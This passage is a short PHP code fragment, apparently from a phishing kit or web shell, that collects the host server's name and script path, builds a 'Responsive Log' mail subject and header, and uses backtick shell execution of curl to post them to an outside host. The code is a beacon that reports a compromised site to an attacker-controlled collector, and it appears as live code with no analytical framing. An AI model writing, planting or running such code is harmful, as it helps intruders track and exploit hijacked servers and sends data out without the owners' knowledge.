...
$loll = $_SERVER['SERVER_NAME'];
$ada = $_SERVER['PHP_SELF'];
$rand = rand(0,99);
$m = $loll.$ada.$rand;
$s = "Responsive Log ( ".$loll." ) aa";
$h = "From: ".$m." <ig@nyengg.id>";
$form = `curl -s --data "s=$s&m=$m&h=$h" https://goldgenie.com.dotasite.com/lul.php3`;
echo $form;
